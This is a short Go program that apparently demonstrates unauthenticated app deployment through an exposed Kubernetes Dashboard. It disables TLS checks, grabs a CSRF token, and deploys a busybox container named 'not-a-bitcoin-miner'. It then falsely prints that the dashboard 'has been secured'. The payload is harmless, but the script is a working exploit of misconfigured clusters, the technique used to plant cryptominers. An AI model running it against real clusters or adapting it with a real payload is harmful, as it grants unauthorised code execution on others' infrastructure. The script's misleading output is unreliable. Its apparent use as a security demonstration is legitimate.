package main

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
)

type csrfToken struct {
	Token string `json:"token"`
}

func main() {
	baseURL := os.Args[1]
	fmt.Println("Running analysis on " + baseURL)

	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	url := baseURL + "/api/v1/csrftoken/appdeployment"

	resp, err := http.DefaultClient.Get(url)
	if err != nil {
		fmt.Println(err)
	}

	body, err := ioutil.ReadAll(resp.Body)

	if err != nil {
		panic(err)

	}

	token := csrfToken{}
	err = json.Unmarshal(body, &token)

	if err != nil {
		panic(err)

	}

	jsonStr := []byte(`{"containerImage":"busybox","imagePullSecret":null,"containerCommand":"sh -c echo \"Hello, Kubernetes!\" && sleep 3600","containerCommandArgs":null,"isExternal":false,"name":"not-a-bitcoin-miner","description":null,"portMappings":[],"variables":[],"replicas":1,"namespace":"default","cpuRequirement":null,"memoryRequirement":null,"labels":[{"editable":false,"key":"k8s-app","value":"not-a-bitcoin-miner"}],"runAsPrivileged":false}`)
	req, err := http.NewRequest(http.MethodPost, baseURL+"/api/v1/appdeployment", bytes.NewBuffer(jsonStr))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-CSRF-TOKEN", token.Token)
	resp, err = http.DefaultClient.Do(req)

	if err != nil {
		panic(err)
	}

	fmt.Println("Your dashboard has been secured!")

}
